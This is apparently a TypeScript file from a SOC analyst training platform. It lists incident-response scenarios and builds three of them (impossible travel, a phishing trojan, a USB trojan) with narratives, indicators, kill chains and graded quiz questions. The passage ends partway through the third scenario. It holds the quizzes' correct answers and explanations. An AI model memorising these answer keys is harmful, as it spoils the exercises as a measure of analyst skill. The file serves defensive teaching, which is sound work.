    summary: "Falcon raised a critical detection on a laptop for an unsigned binary in the user's AppData profile, the morning she installed a free PDF tool. Establish what was installed, what it is doing and what has left the machine." },
  { slug: "multi-host-intrusion",
    title: "Three EDR incidents on three hosts tonight",
    difficulty: "advanced", attack_kind: "multi_host_intrusion",
    threat_actor: "Hands-on-keyboard intrusion operator (pre-ransomware)", build: withAlerts(buildMultiHostIntrusionScenario),
    summary: "Three Falcon detections opened as separate incidents on a finance workstation, a file server and a backup server within forty minutes. Investigate each host, decide whether they are connected, and scope before you contain." },
  { slug: "ai-llmjacking-bedrock",
    title: "Bedrock cost alert on QuantumBank's AWS account",
    difficulty: "advanced", attack_kind: "llmjacking",
    threat_actor: "Financially motivated LLMjacking operator (AI capacity resale)", build: withAlerts(buildAiLlmJackingScenario),
    summary: "A GuardDuty finding on the release pipeline's IAM user and a Bedrock cost alert land on QuantumBank's AWS account overnight, in a week the platform team is also working on Bedrock. Use CloudTrail and the Bedrock logs to work out what the identity was used for, by whom, and what the logs no longer show." },
  { slug: "gws-phishing-attachment",
    title: "Critical Mac detection after a supplier invoice",
    difficulty: "beginner", attack_kind: "phishing_attachment",
    threat_actor: "Business email compromise operator", build: withAlerts(buildGwsPhishingAttachmentScenario),
    summary: "Falcon flagged a Mac laptop moments after the user opened an invoice from a supplier received through Google Workspace. Establish how the file arrived, whether anything left the machine and what else in the tenant is affected." },
  { slug: "seo-poisoned-installer",
    title: "High-severity Defender incident on an admin laptop",
    difficulty: "beginner", attack_kind: "user_execution",
    threat_actor: "Commodity SEO-poisoning operator", build: withAlerts(buildSeoPoisonedInstallerScenario),
    summary: "Defender for Endpoint raised a high-severity incident on an admin's laptop while she was installing an SSH client for routine work. Work out how the installer reached the machine, what it actually did and what has left the building." },
  { slug: "iso-container-smuggling",
    title: "Critical EDR detection after an overdue invoice email",
    difficulty: "beginner", attack_kind: "defense_evasion",
    threat_actor: "Commodity malware distributor", build: withAlerts(buildIsoContainerSmugglingScenario),
    summary: "Falcon flagged a laptop shortly after the user opened what she thought was an overdue invoice from an email. Work out how the file got there and why the Windows security warning on it did not stop what followed." },
  { slug: "clickfix-fake-captcha",
    title: "Blocked outbound connection on a browsing workstation",
    difficulty: "beginner", attack_kind: "user_execution",
    threat_actor: "ClickFix social-engineering operator", build: withAlerts(buildClickFixFakeCaptchaScenario),
    summary: "Falcon raised a critical detection on a workstation for a process chain that ended in a blocked outbound connection while the user was browsing. Work out how the first process started and how far the chain got." },
  { slug: "scheduled-task-persistence",
    title: "SIEM alert on an HR coordinator's laptop",
    difficulty: "beginner", attack_kind: "persistence",
    threat_actor: "Commodity loader operator", build: withAlerts(buildScheduledTaskPersistenceScenario),
    summary: "The SIEM fired on an HR coordinator's laptop for an unsigned binary under her AppData folder that started early this morning. Work out how it got onto the machine, what started it and what it does when it runs." },

  // ── P0 attack-coverage additions (docs/live-feed-attack-coverage-review.md) ──
  { slug: "infostealer-session-theft",
    title: "Killed process and a new sign-in for one user",
    difficulty: "intermediate", attack_kind: "credential_access",
    threat_actor: "Commodity infostealer distributor (Lumma/StealC-style MaaS)", build: withAlerts(buildInfostealerSessionTheftScenario),
    summary: "Falcon killed a process on a laptop and, around the same time, Entra ID logged a sign-in for the same user from an address never seen for her before. Establish what the process did, what the sign-in is and what is still reachable." },
  { slug: "helpdesk-mfa-reset",
    title: "Routine MFA reset ticket and two sign-ins",
    difficulty: "intermediate", attack_kind: "valid_accounts",
    threat_actor: "Scattered-Spider-style ATO operator (help-desk social engineering)", build: withAlerts(buildHelpdeskMfaResetScenario),
    summary: "A ServiceNow MFA reset for a NexaCorp employee was resolved this morning, and Entra shows two MFA-satisfied sign-ins for the account within the hour, followed by a new VDI session. Decide whether this is ordinary support and what happens next." },
  { slug: "edge-vpn-cve-exploit",
    title: "VPN user correlation alert on a jump host",
    difficulty: "advanced", attack_kind: "exploit_public_facing",
    threat_actor: "Opportunistic access broker (mass edge-appliance exploitation)", build: withAlerts(buildEdgeVpnCveExploitScenario),
    summary: "Sentinel raised a high correlation alert overnight tying a VPN user's external IP and tunnel address to an internal jump host. Work out where the activity actually started and how far it reached." },
  { slug: "exfil-first-extortion",
    title: "Threatening email to NexaCorp's security mailbox",
    difficulty: "advanced", attack_kind: "exfiltration",
    threat_actor: "Exfiltration-only extortion crew (BianLian/Karakurt-style — no encryptor deployed)", build: withAlerts(buildExfilFirstExtortionScenario),
    summary: "Sentinel escalated an incident to critical overnight after NexaCorp's security mailbox received an email referencing client records. Work out whether anything left the environment, how, and why nothing stopped it." },

  // ── P1 use-case expansion (scenario-usecase-map: privilege escalation ×2, lateral movement, insider DLP, NAC) ──
  { slug: "windows-privesc-token",
    title: "Rare privilege alert for an IIS service account",
    difficulty: "intermediate", attack_kind: "windows_privilege_escalation",
    threat_actor: "Post-exploitation operator on a compromised web-app service account", build: withAlerts(buildWindowsPrivescTokenScenario),
    summary: "Sentinel flagged a rare privilege event and an unusual process for a web service account on an IIS host within six minutes, while another team handles the web app. Determine what the account did on the host and what it reached." },
  { slug: "linux-privesc-suid",
    title: "Critical Falcon detection on an Ubuntu app server",
    difficulty: "intermediate", attack_kind: "linux_privilege_escalation",
    threat_actor: "Opportunistic intruder operating a www-data web-shell foothold", build: withAlerts(buildLinuxPrivescSuidScenario),
    summary: "Falcon flagged a shell on an internet-facing Ubuntu application server whose effective and real user IDs do not match. Establish how this happened, prove whether it succeeded and find what followed." },
  { slug: "lateral-movement-pth",
    title: "Night-time privileged logons for an infrastructure admin",
    difficulty: "intermediate", attack_kind: "lateral_movement",
    threat_actor: "Hands-on-keyboard intrusion operator (post-foothold, credential-replay)", build: withAlerts(buildLateralMovementPthScenario),
    summary: "Sentinel flagged privileged authentications for an infrastructure admin across several hosts within minutes, in the middle of the night. Work out how the account was used, where the credential came from and how far it reached." },
  { slug: "insider-dlp-usb-cloud",
    title: "Sentinel incident for a finance analyst who resigned",
    difficulty: "intermediate", attack_kind: "insider_data_theft",
    threat_actor: "Malicious insider (departing employee, valid account — no external actor)", build: withAlerts(buildInsiderDlpUsbCloudScenario),
    summary: "Sentinel raised an incident for a senior financial analyst whose resignation is already in Workday. Establish what left the environment, by which routes, and whether it was legitimate work." },
  { slug: "nac-rogue-device",
    title: "NAC alert for an unknown endpoint on SW-ACC-07",
    difficulty: "beginner", attack_kind: "rogue_device",
    threat_actor: "Unauthorized insider / unmanaged device (physical network access)", build: withAlerts(buildNacRogueDeviceScenario),
    summary: "Cisco ISE quarantined an access-switch port after a high alert on the endpoint connected to it. Establish what the device is, how it got on the network and whether anything followed." },

  // ── P2 use-case expansion (scenario-usecase-map: macOS, DB-layer, Azure-native, CI/CD, UEBA, social-eng, PAM) ──
  { slug: "macos-stealer-dmg",
    title: "Falcon alert on a designer's MacBook (MB-CR-14)",
    difficulty: "intermediate", attack_kind: "macos_infostealer",
    threat_actor: "Commodity macOS infostealer operator (Atomic/AMOS-family), distributing via pirated-app disk images", build: withAlerts(buildMacosStealerDmgScenario),
    summary: "Falcon raised a critical alert on a designer's MacBook after the user ran a free copy of a paid design tool from a disk image. Work out what ran, what it touched and what left the machine." },
  { slug: "sqli-db-exfil",
    title: "Imperva alerts on shop.nexacorp.com and unusual ShopDB reads",
    difficulty: "advanced", attack_kind: "sql_injection",
    threat_actor: "External web attacker automating SQL injection against a public storefront", build: withAlerts(buildSqliDbExfilScenario),
    summary: "Imperva alerts against the shop's search endpoint and unusual reads reported by the DB team arrived the same night. Work out whether anything got past the WAF, what the database and its host did and how much data is at risk." },
  { slug: "azure-managed-identity-abuse",
    title: "Microsoft Graph Security incident for svc-billing-connector",
    difficulty: "advanced", attack_kind: "cloud_privilege_escalation",
    threat_actor: "Cloud intrusion operator abusing a compromised workload identity (post-foothold)", build: withAlerts(buildAzureManagedIdentityAbuseScenario),
    summary: "An automation identity that normally runs only from the billing release pipeline began signing in from an unfamiliar address and reached Key Vault and Storage. Work out how that started, what it read and how far it went." },
  { slug: "cicd-supply-chain",
    title: "GuardDuty finding on the payments-api deployment role",
    difficulty: "advanced", attack_kind: "supply_chain",
    threat_actor: "Intrusion operator abusing a compromised repository maintainer account", build: withAlerts(buildCicdSupplyChainScenario),
    summary: "GuardDuty raised a high finding on the role the payments-api pipeline uses to deploy. Determine how the pipeline's cloud credentials were obtained, what changed in the repository and which cloud resources they reached." },
  { slug: "ueba-compromised-account",
    title: "Sentinel risk score raised for a Finance manager",
    difficulty: "intermediate", attack_kind: "account_compromise",
    threat_actor: "External actor operating a stolen session (cloud identity takeover — no host foothold)", build: withAlerts(buildUebaCompromisedAccountScenario),
    summary: "Sentinel UEBA raised a Finance manager's risk score to high overnight, with no detection verdict and nothing blocked. Pivot from the score into the sign-in and audit telemetry and decide what the anomalies mean." },
  { slug: "vishing-rmm",
    title: "Falcon detection on a payments clerk's workstation (WKS-QB-047)",
    difficulty: "intermediate", attack_kind: "social_engineering",
    threat_actor: "Voice-phishing initial-access operator (help-desk impersonation, RMM-enabled)", build: withAlerts(buildVishingRmmScenario),
    summary: "CrowdStrike flagged a payments clerk's workstation minutes after the service desk logged a ticket for the same user. Determine whether the activity is sanctioned support, how it started and what to contain." },
  { slug: "pam-vault-abuse",
    title: "Night-time domain-admin checkout from CyberArk",
    difficulty: "advanced", attack_kind: "privileged_access_abuse",
    threat_actor: "Credential-abusing operator misusing a PAM-vaulted domain-admin account (insider or account takeover)", build: withAlerts(buildPamVaultAbuseScenario),
    summary: "Sentinel flagged a domain-admin credential that an on-call engineer pulled from CyberArk in the middle of the night. Decide whether the checkout was legitimate, what the credential did next and how far it reached." },

  // ── P3 use-case expansion (scenario-usecase-map: wiper, S3 exfil, Golden SAML, GWS OAuth, threat-intel hunt, container escape) ──
  { slug: "destructive-wiper",
    title: "Critical detection and unbootable machines at Vantage Industrial",
    difficulty: "advanced", attack_kind: "destructive_attack",
    threat_actor: "Destructive intrusion operator (data-destruction objective, wiper deployed via a compromised admin)", build: withAlerts(buildDestructiveWiperScenario),
    summary: "Falcon raised a critical detection on a Vantage Industrial workstation, and the service desk reports machines rebooting to no operating system. Establish what executed, how it got there, how far it spread and what recovery looks like." },
  { slug: "s3-exfil-exposure",
    title: "GuardDuty finding on MedCore's patient exports bucket",
    difficulty: "intermediate", attack_kind: "cloud_data_exfiltration",
    threat_actor: "Operator abusing a leaked, over-permissioned IAM access key", build: withAlerts(buildS3ExfilExposureScenario),
    summary: "GuardDuty raised a high finding on a production bucket of regulated MedCore records that should never be public. Work out what changed, which credential was involved and how much left." },
  { slug: "golden-saml",
    title: "Overnight federated sign-in for a Global Administrator",
    difficulty: "expert", attack_kind: "federation_abuse",
    threat_actor: "Nation-state-style intrusion set abusing a compromised federation server (SolarWinds / APT29 TTP)", build: withAlerts(buildGoldenSamlScenario),
    summary: "Sentinel flagged a federated sign-in from an external address overnight for a NexaCorp Global Administrator. Work out how the sign-in was authenticated, which identities are exposed and how far it reached." },
  { slug: "gws-oauth-marketplace",
    title: "Sensitive-scope app grant alert at RocketStack",
    difficulty: "intermediate", attack_kind: "oauth_abuse",
    threat_actor: "Consent-phishing operator abusing a third-party OAuth app (cloud identity, no host foothold)", build: withAlerts(buildGwsOauthMarketplaceScenario),
    summary: "Google Workspace Alert Center flagged a third-party app granted sensitive access for a RocketStack user. Work out what the app accessed, whether the grant is legitimate and what contains it." },
  { slug: "threat-intel-hunt",
    title: "New intel list to check across the estate",
    difficulty: "intermediate", attack_kind: "threat_hunt",
    threat_actor: "GLASSTHORN intrusion set (TEMP.Halberd) — SystemBC proxy-implant operator", build: withAlerts(buildThreatIntelHuntScenario),
    summary: "An intel provider pushed new network destinations and a file fingerprint linked to an active operation, and nothing has alarmed yet. Sweep the environment and decide which matching machines, if any, need action." },

  // ── P4 use-case expansion (scenario-usecase-map Part 5: mobile/MDM, GCP-native, macOS TCC, email-bomb social-eng, OT/ICS, BEC wire fraud) ──
  { slug: "mobile-mdm-compromise",
    title: "Intune non-compliance for a corporate Android phone",
    difficulty: "intermediate", attack_kind: "mobile_compromise",
    threat_actor: "Mobile-phishing operator (smishing-led device takeover, no host foothold)", build: withAlerts(buildMobileMdmCompromiseScenario),
    summary: "Intune marked a user's corporate Android phone non-compliant after a Mobile Threat Defense signal. Determine what happened to the device and whether access from it should be trusted." },
  { slug: "gcp-sa-key-theft",
    title: "Two SCC findings on a data-pipeline service account",
    difficulty: "advanced", attack_kind: "cloud_credential_theft",
    threat_actor: "Operator abusing a compromised developer identity to key an over-permissioned GCP service account", build: withAlerts(buildGcpSaKeyTheftScenario),
    summary: "Security Command Center raised two low findings on a data-pipeline service account in RocketStack's production data project. Work out what happened to the account, what it touched and how far it reached." },
  { slug: "macos-tcc-pkg",
    title: "Critical Falcon detection on a product manager's MacBook",
    difficulty: "intermediate", attack_kind: "macos_tcc_bypass",
    threat_actor: "macOS intrusion operator distributing a trojanized installer package (fake productivity/meeting app)", build: withAlerts(buildMacosTccPkgScenario),
    summary: "Falcon flagged a product manager's MacBook a minute after a newly downloaded installer package was run. Work out what the installer did, which protected data it reached and whether anything remains." },
  { slug: "email-bomb-helpdesk",
    title: "Remote-support session on an accounts payable workstation",
    difficulty: "intermediate", attack_kind: "email_bomb_social_eng",
    threat_actor: "Social-engineering intrusion operator (mail-flood pretext, help-desk impersonation)", build: withAlerts(buildEmailBombHelpdeskScenario),
    summary: "CrowdStrike flagged an accounts payable workstation where a built-in remote-support tool started and the session ran commands. Decide whether this was real IT support, how it started and what to contain." },
  { slug: "ot-network-anomaly",
    title: "Suricata ICS alert for a production line PLC",
    difficulty: "advanced", attack_kind: "ot_ics_intrusion",
    threat_actor: "IT-to-OT pivot operator issuing industrial-protocol commands from a corporate foothold", build: withAlerts(buildOtNetworkAnomalyScenario),
    summary: "A Suricata ICS alert fired at night for traffic to a production line controller, seen only through passive network sensors. Work out who sent it, what it did and how to scope a response with no plant-side endpoint agent." },
  { slug: "bec-wire-fraud",
    title: "Urgent wire request to Accounts Payable",
    difficulty: "intermediate", attack_kind: "bec_wire_fraud",
    threat_actor: "Business email compromise operator (external executive impersonation, no host or mailbox foothold)", build: withAlerts(buildBecWireFraudScenario),
    summary: "Defender for Office 365 flagged an urgent wire-transfer email to Accounts Payable that presents as the CFO, and Finance reported a phone call chasing the same payment. Decide whether the request is genuine before any money moves." },
] as const;

// ─── Impossible Travel — Account Compromise via Stolen Credentials ────────────

export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-2026"): ScenarioBundle {
  const { title, events, T, MIN, nigIp } = impossibleTravelScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",    value: nigIp,                               reputation: "malicious", tags: ["attacker-ip", "MTN Nigeria", "Lagos"] },
    { type: "email", value: "collector.k.taylor@protonmail.com", reputation: "malicious", tags: ["attacker-email", "inbox-forward-target"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "External Threat Actor (Credential Theft)",
    attack_kind: "account_compromise",
    briefing: "Entra ID Protection raised a high-risk, unlikely-travel sign-in on k.taylor at 09:06, minutes after the VPN logged a second session for the same account from a new country. A burst of failed sign-ins preceded it. The user has not been contacted yet.",
    narrative: `A password-spray burst from a Nigerian IP ended in a successful sign-in to k.taylor's account. At 09:00 k.taylor connected to the VPN normally from Tel Aviv; four minutes later the same account connected from Lagos, Nigeria — 4,320 km away, physically impossible. The VPN sign-in went through Entra with a single factor (no MFA), Entra ID Protection rated the O365 sign-in high risk (unlikely travel), and the attacker then created a hidden inbox forwarding rule to a ProtonMail address, used the VPN tunnel to reach the engineering file server over SMB, and downloaded 847 SharePoint files (2.3 GB). The failed-login origin, the shared Entra session id and the tunnel IP tie the chain together.`,
    learning_objectives: [
      "Recognize impossible travel as a credential compromise indicator",
      "Identify a single-factor VPN sign-in (no MFA) as the gap that let the stolen password work",
      "Detect hidden inbox forwarding rules (T1114.003)",
      "Correlate the credential-origin spray, VPN, Entra risk, VPN-tunnel SMB traffic, and SharePoint download into one chain",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-28 * MIN), phase: "Credential Access", action: "Password-spray burst from a Nigerian IP ends in a valid password for k.taylor" },
      { ts: T(0),        phase: "Normal Baseline",  action: "k.taylor VPN login from Tel Aviv — looks normal" },
      { ts: T(4 * MIN),  phase: "Impossible Travel", action: "Same user VPN login from Lagos, Nigeria — 4 min later, 4,320 km away" },
      { ts: T(4 * MIN + 20_000), phase: "Stealth", action: "VPN app sign-in through Entra with a single factor — no MFA" },
      { ts: T(6 * MIN),  phase: "Detection",        action: "Entra ID Protection flags the O365 sign-in high risk (unlikely travel)" },
      { ts: T(9 * MIN),  phase: "Email Persistence", action: "Inbox forwarding rule created: all mail → protonmail attacker address" },
      { ts: T(11 * MIN), phase: "Lateral Movement",  action: "VPN tunnel IP opens an SMB session to the engineering file server" },
      { ts: T(14 * MIN), phase: "Data Collection",   action: "847 SharePoint files (2.3 GB) downloaded in 5 minutes" },
    ],
    questions: [
      { id: "q1", prompt: "What is the key indicator that proves this is a compromised credential rather than k.taylor traveling?", kind: "single",
        options: [
          { value: "distance", label: "4,320 km between Tel Aviv and Lagos in 4 minutes — physically impossible travel" },
          { value: "time",     label: "The Lagos sign-in happened in the middle of the night for k.taylor's usual time zone" },
          { value: "vpn",      label: "The second VPN login terminated on a different GlobalProtect gateway than the first" },
          { value: "device",   label: "The device hostname on the second login differs from k.taylor's usual laptop" },
        ],
        answer: "distance", xp: 50,
        explanation: "The 4-minute gap between logins from cities 4,320 km apart is physically impossible — no aircraft travels at 64,800 km/h. This is the definitive indicator of impossible travel, not timing or device differences. Distance-to-time ratio is the core of impossible travel detection." },
      { id: "q2", prompt: "What field in the VPN logs most directly proves credential theft (not a legitimate VPN split-tunnel or proxy)?", kind: "single",
        options: [
          { value: "ip",       label: "The source IP is from a Nigerian ISP (MTN Nigeria)" },
          { value: "device",   label: "gp.device_registered: false — unrecognized device" },
          { value: "mfa",      label: "MFA was not challenged for the Nigerian login" },
          { value: "country",  label: "The GeoLocation country_name field shows Nigeria" },
        ],
        answer: "device", xp: 75,
        explanation: "An unregistered device (gp.device_registered: false) proves the login came from hardware the organization never enrolled — eliminating VPN split-tunnel and corporate proxy scenarios. A registered corporate device behind a Nigerian exit node would still show gp.device_registered: true. The Nigerian IP alone could be a VPN exit node used by a traveling employee." },
      { id: "q3", prompt: "After confirming impossible travel, what is the FIRST containment action?", kind: "single",
        options: [
          { value: "block_ip",  label: "Block the Nigerian source IP at the perimeter firewall" },
          { value: "revoke",    label: "Revoke all active sessions, then reset the password" },
          { value: "notify",    label: "Email k.taylor to confirm whether they are in Nigeria" },
          { value: "monitor",   label: "Keep monitoring the session to gather more evidence" },
        ],
        answer: "revoke", xp: 50,
        explanation: "Revoking all active sessions immediately terminates the attacker's access even while evidence-gathering continues. Blocking the IP fails if the attacker switches exit nodes. Notifying the user wastes precious minutes while SharePoint files are being downloaded. Continued monitoring without action allows the exfiltration to complete." },
      { id: "q4", prompt: "The attacker downloaded 847 SharePoint files (2.3 GB) in 5 minutes. Which log source would provide the most forensically complete list of exactly which files were accessed?", kind: "single",
        options: [
          { value: "o365",      label: "O365 Unified Audit Log (SharePoint FileDownloaded operations)" },
          { value: "vpn",       label: "GlobalProtect VPN session logs (bytes transferred per session)" },
          { value: "dlp",       label: "Microsoft Purview DLP alerts (FileDownloaded policy matches)" },
          { value: "firewall",  label: "Perimeter firewall egress logs (bytes out to the attacker's IP)" },
        ],
        answer: "o365", xp: 75,
        explanation: "The O365 Unified Audit Log records each individual FileDownloaded operation with the exact file path, site URL, and timestamp. VPN logs show total session bytes but cannot identify individual files. DLP may not have triggered if no sensitive data policies matched. Firewall egress shows volume but not file identity." },
    ],
  };
}

// =========================================================================
// Foundation Scenario A: Phishing Attachment → Malware Execution → Workstation Compromise
// The simplest possible attack in the platform — one host, one user, no
// lateral movement, no credential theft, no cloud pivot. This is the story a
// student who is brand-new to SOC work should see first: an everyday
// phishing email leads to a malware infection, and the EDR eventually
// catches it. Nothing here requires knowing Kerberos, cloud IAM, or AD.
// =========================================================================

export function buildPhishingMalwareScenario(scenarioId = "phishing-malware-basic-2026"): ScenarioBundle {
  const { title, events, T, MIN, c2Domain, c2Ip, fileHash, zipHash, senderIp, senderDomain } = phishingMalwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "newly-registered-domain"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "domain", value: senderDomain, reputation: "malicious", tags: ["phishing-sender"] },
    { type: "ip",     value: senderIp,     reputation: "malicious", tags: ["phishing-sender"] },
    { type: "sha256", value: fileHash, reputation: "malicious", tags: ["commodity-trojan", "double-extension"] },
    { type: "sha256", value: zipHash,  reputation: "malicious", tags: ["email-attachment", "zip-container"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "phishing_malware_basic",
    briefing: "The EDR terminated a process on WS-HR-1182 (r.avraham) at 10:24, and the firewall logged a session from the same host to an external domain at 10:21. The mail gateway recorded an inbound attachment for the same user earlier this morning. Confirm what ran on the host, how it got there, and whether anything left the machine.",
    narrative: `r.avraham received a phishing email disguised as a shipping notification, with a ZIP attachment hiding a trojan behind a double file extension (.pdf.exe). She opened the message in Outlook on the web and Chrome downloaded the ZIP (same SHA256 as the attachment record), Explorer extracted the .pdf.exe, and when it ran it resolved and connected to a newly registered domain, then opened two more sessions to the same server, the last one sending about 38 KB out. The EDR killed the process about three minutes after it started, once its command-and-control traffic was visible; the file itself stayed on disk. ZAP then pulled the message from the inbox - but the workstation was infected, and some data may have left it, from the moment the process ran.`,
    learning_objectives: [
      "Recognize a phishing email with a disguised executable attachment (T1566.001)",
      "Identify user execution of a double-extension file as the actual infection point (T1204.002)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe - young domains are a strong indicator",
      "See how EDR detection can lag behind execution - the workstation is compromised the moment the process runs, not when it's caught",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),               phase: "Initial Access",  action: "Phishing email with ZIP attachment delivered to r.avraham" },
      { ts: T(5 * MIN + 20_000), phase: "Delivery",      action: "The user opens the message in Outlook on the web; Chrome saves the ZIP to Downloads and Explorer extracts the .pdf.exe" },
      { ts: T(6 * MIN),         phase: "Execution",       action: "r.avraham double-clicks the disguised .pdf.exe - malware runs" },
      { ts: T(6 * MIN + 43_000), phase: "Command & Control", action: "The process resolves a newly registered domain and connects to it; URL filtering logs the session but allows it" },
      { ts: T(8 * MIN + 30_000), phase: "Exfiltration",    action: "A third session to the same server sends about 38 KB out" },
      { ts: T(9 * MIN),         phase: "Detection",       action: "EDR kills the process after its C2 traffic; the file stays on disk" },
      { ts: T(11 * MIN),        phase: "Response",        action: "ZAP moves the message to quarantine" },
    ],
    questions: [
      { id: "q1", prompt: "What is the single clearest sign that Delivery_Notice_48213.pdf.exe is not really a PDF?", kind: "single",
        options: [
          { value: "size",  label: "The archive is only 18KB, far too small for a real shipping document" },
          { value: "ext",   label: "The real file extension is .exe, hidden behind a fake .pdf in the name" },
          { value: "email", label: "The email arrived from an external sender outside the organization's mail domain" },
          { value: "user",  label: "r.avraham works in HR and has no business reason to receive a shipping notice" },
        ],
        answer: "ext", xp: 40,
        explanation: "A double extension like .pdf.exe is a classic disguise - Windows only looks at the LAST extension (.exe) to decide how to run the file, but a distracted user only sees '.pdf' at a glance. The file size and sender being external are supporting context, not the direct proof." },
      { id: "q2", prompt: "The firewall ALLOWED the connection to shiptrack-updates-net.xyz. Does that mean the connection was safe?", kind: "single",
        options: [
          { value: "yes", label: "Yes - the firewall returned action=allow, which means the destination passed its threat and URL filtering checks" },
          { value: "no",  label: "No - 'allowed' just means it wasn't on a blocklist yet; a domain the firewall categorises as newly registered is itself suspicious" },
        ],
        answer: "no", xp: 50,
        explanation: "Firewalls default to allow unless a domain is already known-bad. A newly registered domain (PAN-DB: registered within the last ~32 days) is a strong red flag on its own - legitimate business services are almost never that young. 'Allowed by the firewall' and 'safe' are not the same thing, and a SOC analyst has to evaluate the domain itself, not just the firewall verdict." },
      { id: "q3", prompt: "At what point was WS-HR-1182 actually compromised?", kind: "single",
        options: [
          { value: "email",   label: "When the phishing email landed in r.avraham's inbox" },
          { value: "execute", label: "When r.avraham double-clicked the .pdf.exe and it ran" },
          { value: "detect",  label: "When CrowdStrike raised its detection and killed the process" },
        ],
        answer: "execute", xp: 60,
        explanation: "Compromise happens at execution, not at delivery or at detection. The email sitting unopened in an inbox is not a compromise. The kill at the end is the response catching up to an infection that already happened minutes earlier - this is why 'the EDR caught it eventually' is not the same as 'nothing bad happened.'" },
      { id: "q4", prompt: "The firewall logged three sessions from WS-HR-1182 to 194.26.135.88 before the EDR killed the process. Which conclusion do the logs support?", kind: "single",
        options: [
          { value: "nothing", label: "Nothing left the host: all three sessions were short check-ins of similar size, so only the infection itself needs handling" },
          { value: "some",    label: "The third session sent about 38 KB out against about 1 KB in the second, so data probably left and the credentials saved on this host should be treated as exposed" },
          { value: "killed",  label: "The EDR kill proves no data was sent, because the process was stopped before it could finish any transfer, so no account needs a reset" },
        ],
        answer: "some", xp: 60,
        explanation: "bytes_sent in the PAN TRAFFIC rows climbs from about 1 KB (the second session) to 38,000 bytes (the third), while the replies stay small. A short check-in grows into an upload to the same attacker server, so the incident is a possible data theft, not only an infection. Killing the process stops further traffic but does not undo what was already sent, and a stealer-type trojan on a workstation typically takes saved browser and mail credentials, so those accounts need a reset." },
    ],
  };
}

// =========================================================================
// Foundation Scenario B: Malicious USB Drive → Trojan Persistence → Workstation Compromise
// Second beginner-tier scenario - different infection vector (physical media
// instead of email) so a student's first few sessions aren't all identical.
// Still one host, one user, EDR-only telemetry, no lateral movement.
// =========================================================================

export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): ScenarioBundle {
  const { title, events, T, MIN, fileHash, c2Domain, c2Ip } = usbMalwareScenarioEvents();

  const iocs: IOC[] = [
    { type: "sha256", value: fileHash, reputation: "malicious", tags: ["trojan-dropper", "removable-media"] },
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Commodity Malware / Opportunistic Physical Access",
    attack_kind: "usb_malware_basic",
    briefing: "The EDR quarantined a file on WS-OPS-2214 at 13:35, and the SIEM raised a threat-intelligence match on a DNS lookup from the same workstation at 13:34. The assigned user, m.levi, has not reported anything.",
    narrative: `An untagged USB drive (SanDisk Cruzer Blade, serial 4C530001071117107564) was recognised by WS-OPS-2214 at 13:29. Explorer read USB_Backup_Tool.exe from E:\\ and copied it to the Desktop. m.levi ran it, believing it to be a legitimate backup tool. The binary wrote a Registry Run key to survive reboots, looked up sync-winbackup.net (the SIEM's threat-intelligence feed matched the name) and opened two HTTPS sessions to 91.215.85.17 before the EDR killed and quarantined it. The drive serial, the file hash and the C2 domain and IP are all in the records, and persistence was already established.`,
    learning_objectives: [
      "Recognize removable media as an infection vector, separate from email or the network",
      "Identify user execution of an unsigned, never-before-seen binary (T1204.002)",
      "Understand Registry Run key persistence as a beginner-level but very common technique (T1547.001)",
      "See that 'quarantined' does not mean 'nothing happened' - persistence was already established",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-1 * MIN),         phase: "Initial Access", action: "Untagged USB drive recognised as E:\\ on WS-OPS-2214 (Windows Security 6416)" },
      { ts: T(0),                phase: "Initial Access", action: "USB_Backup_Tool.exe read from E:\\ and copied to the Desktop" },
      { ts: T(3 * MIN),          phase: "Execution",      action: "m.levi double-clicks the unsigned binary - malware runs" },
      { ts: T(3 * MIN + 20_000), phase: "Persistence",    action: "Malware writes a Registry Run key to survive reboot" },
      { ts: T(3 * MIN + 50_000), phase: "Command & Control", action: "The binary resolves an external domain and connects out; the SIEM's threat-intelligence feed matches the domain" },
      { ts: T(5 * MIN),          phase: "Detection",      action: "EDR kills the process and quarantines the file" },
    ],
    questions: [
      { id: "q1", prompt: "Which records show how USB_Backup_Tool.exe reached WS-OPS-2214?", kind: "single",
        options: [
          { value: "usb",    label: "A 6416 device-recognised event for a USB drive, then a read of E:\\USB_Backup_Tool.exe by explorer.exe, then the same file hash written to the Desktop" },
          { value: "mail",   label: "A mail-gateway delivery of an attachment, saved by the mail client and extracted to the Desktop by the user" },
          { value: "web",    label: "A browser download from the sync-winbackup.net site, written to the Desktop by the browser process" },
          { value: "deploy", label: "A software-deployment push from a management server over SMB, written by a system service" },
        ],
        answer: "usb", xp: 40,
        explanation: "The two 6416 records name the device (SanDisk Cruzer Blade, serial 4C530001071117107564) a minute before anything else happens. The 4663 record shows explorer.exe reading E:\\USB_Backup_Tool.exe, and Falcon's PeFileWritten shows the same SHA256 landing on the Desktop two seconds later. There is no mail, browser or deployment record for the file, so removable media is the delivery path. An untagged drive is also a policy question for IT, but the logs are what prove the route." },
      { id: "q2", prompt: "Which single event in this chain represents the malware becoming PERSISTENT (surviving a reboot)?", kind: "single",
        options: [
          { value: "copy",    label: "USB_Backup_Tool.exe being copied from the USB drive to the Desktop" },
          { value: "execute", label: "m.levi double-clicking USB_Backup_Tool.exe, launched by explorer.exe" },
          { value: "persist", label: "The HKCU Run value SystemBackupSvc being written for the tool" },
        ],
        answer: "persist", xp: 50,
        explanation: "Copying and even running the file are one-time events - if the machine reboots before either happens again, the malware is gone. The Registry Run key is what makes the infection survive a reboot, which is the technical definition of persistence (T1547.001)." },
